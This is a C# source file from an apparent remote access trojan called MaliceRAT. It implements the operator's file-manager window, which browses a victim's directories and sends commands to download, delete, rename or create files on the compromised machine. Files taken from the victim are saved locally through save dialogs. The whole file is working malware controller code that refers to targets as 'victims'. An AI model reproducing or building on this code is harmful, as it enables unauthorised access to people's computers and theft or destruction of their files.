using System;
using System.Windows.Forms;
using System.Collections.Generic;
using System.Web.Script.Serialization;
using System.IO;
using MaliceRAT.RatServer;
using System.Linq;

namespace MaliceRAT.RatUI
{
    public partial class FileManagerForm : Form
    {
        #region Variables
        private int victimId;
        private Server server;
        #endregion

        #region Constructor
        public FileManagerForm(int victimId, Server server)
        {
            InitializeComponent();
            InitializeContextMenu();

            this.victimId = victimId;
            this.server = server;

            server.fileManager.FilesAndFoldersReceived += OnFilesAndFoldersReceived;
            server.fileManager.FileUploaded += OnFileUploaded;
            server.fileManager.FileDownloaded += OnFileDownloaded;
        }
        #endregion

        #region Methods
        private string FormatFileSize(string sizeInBytes)
        {
            if (!long.TryParse(sizeInBytes, out long bytes))
                return sizeInBytes;

            string[] suffixes = { "B", "KB", "MB", "GB", "TB", "PB" };
            int suffixIndex = 0;
            double size = bytes;

            while (size >= 1024 && suffixIndex < suffixes.Length - 1)
            {
                size /= 1024;
                suffixIndex++;
            }

            return $"{size:0.##} {suffixes[suffixIndex]}";
        }

        private void OnFilesAndFoldersReceived(Victim victim, string filesAndFoldersJson)
        {
            if (InvokeRequired)
            {
                Invoke(new Action(() => OnFilesAndFoldersReceived(victim, filesAndFoldersJson)));
                return;
            }

            JavaScriptSerializer serializer = new JavaScriptSerializer();
            Dictionary<string, Dictionary<string, string>> filesAndFolders = serializer.Deserialize<Dictionary<string, Dictionary<string, string>>>(filesAndFoldersJson);
            gunaFilesTable.Rows.Clear();

            // Add ".." entry for parent directory if not at root
            if (!string.IsNullOrEmpty(gunadirPath.Text) && gunadirPath.Text != Path.GetPathRoot(gunadirPath.Text))
            {
                var parentRow = new DataGridViewRow();
                parentRow.CreateCells(gunaFilesTable, "..", "DIRECTORY", "");
                gunaFilesTable.Rows.Add(parentRow);
            }

            foreach (var entry in filesAndFolders)
            {
                var row = new DataGridViewRow();
                string formattedSize = entry.Value["Type"] == "DIRECTORY" ? "" : FormatFileSize(entry.Value["Size"]);
                row.CreateCells(gunaFilesTable, entry.Key, entry.Value["Type"], formattedSize);
                gunaFilesTable.Rows.Add(row);
            }
        }

        private void FileManagerForm_Load(object sender, EventArgs e)
        {
            ReadDirectory(gunadirPath.Text);
        }

        private void gunadirPath_TextChanged(object sender, EventArgs e)
        {
            ReadDirectory(gunadirPath.Text);
        }
        #endregion

        #region Files context menu
        private string GetPath()
        {
            return gunadirPath.Text + GetSelectedFile();
        }

        private string GetSelectedFile()
        {
            return gunaFilesTable.SelectedCells[0].Value.ToString();
        }

        private void InitializeContextMenu()
        {
            ContextMenuStrip fileContextMenu = new ContextMenuStrip();
            var menuItems = new[]
            {
                ContextMenuUtilities.CreateContextMenuItem("Download", Download_Click),
                ContextMenuUtilities.CreateContextMenuItem("Delete", Delete_Click),
                ContextMenuUtilities.CreateContextMenuItem("Rename", Rename_Click),
                ContextMenuUtilities.CreateContextMenuItem("Create Folder", CreateFolder_Click)
            };

            fileContextMenu.Items.AddRange(menuItems);
            gunaFilesTable.ContextMenuStrip = fileContextMenu;
            gunaFilesTable.MouseDown += (sender, e) => ContextMenuUtilities.GunaTable_MouseDown(sender, e, gunaFilesTable);
        }

        private void gunaFilesTable_MouseClick(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Right)
            {
                gunaFilesTable.ContextMenuStrip.Show(Cursor.Position);
            }
        }

        private void Download_Click(object sender, EventArgs e)
        {
            var selectedRows = gunaFilesTable.SelectedRows.Cast<DataGridViewRow>().ToList();
            if (selectedRows.Count == 0)
            {
                selectedRows = gunaFilesTable.SelectedCells.Cast<DataGridViewCell>()
                    .Select(cell => cell.OwningRow)
                    .Distinct()
                    .ToList();
            }

            List<string> paths = selectedRows
                .Select(row => Path.Combine(gunadirPath.Text, row.Cells[0].Value.ToString()))
                .ToList();

            server.GetVictimById(victimId).Send(new { type = "fm_download", paths });
        }

        private void Delete_Click(object sender, EventArgs e)
        {
            server.GetVictimById(victimId).Send(new { type = "fm_delete", path = GetPath() });
        }

        private void Rename_Click(object sender, EventArgs e)
        {
            server.GetVictimById(victimId).Send(new { type = "fm_rename", path = GetPath() });
        }

        private void CreateFolder_Click(object sender, EventArgs e)
        {
            server.GetVictimById(victimId).Send(new { type = "fm_mkdir", path = GetPath() });
        }

        private void ReadDirectory(string path)
        {
            server.GetVictimById(victimId).Send(new { type = "fm_list", path });
        }
        #endregion

        #region Event handling
        private void OnFileUploaded(Victim victim, string name, string data)
        {
            this.Invoke((MethodInvoker)delegate
            {
                using (SaveFileDialog saveFileDialog = new SaveFileDialog())
                {
                    saveFileDialog.FileName = name;
                    saveFileDialog.Filter = "All files (*.*)|*.*";

                    if (saveFileDialog.ShowDialog() == DialogResult.OK)
                    {
                        byte[] fileBytes = Convert.FromBase64String(data);
                        File.WriteAllBytes(saveFileDialog.FileName, fileBytes);
                    }
                }
            });
        }

        private void OnFileDownloaded(Victim victim, string name, byte[] data)
        {
            this.Invoke((MethodInvoker)delegate
            {
                using (SaveFileDialog saveFileDialog = new SaveFileDialog())
                {
                    saveFileDialog.FileName = name;
                    saveFileDialog.Filter = "Zip files (*.zip)|*.zip|All files (*.*)|*.*";

                    if (saveFileDialog.ShowDialog() == DialogResult.OK)
                    {
                        File.WriteAllBytes(saveFileDialog.FileName, data);
                    }
                }
            });
        }
        #endregion

        private void gunaFilesTable_CellDoubleClick(object sender, DataGridViewCellEventArgs e)
        {
            if (e.RowIndex >= 0)
            {
                string fileName = gunaFilesTable.Rows[e.RowIndex].Cells[0].Value.ToString();
                string fileType = gunaFilesTable.Rows[e.RowIndex].Cells[1].Value.ToString();

                if (fileType == "DIRECTORY")
                {
                    string newPath;
                    if (fileName == "..")
                    {
                        newPath = Path.GetDirectoryName(gunadirPath.Text);
                    }
                    else
                    {
                        newPath = Path.Combine(gunadirPath.Text, fileName);
                    }
                    gunadirPath.Text = newPath;
                    ReadDirectory(newPath);
                }
            }
        }
    }
}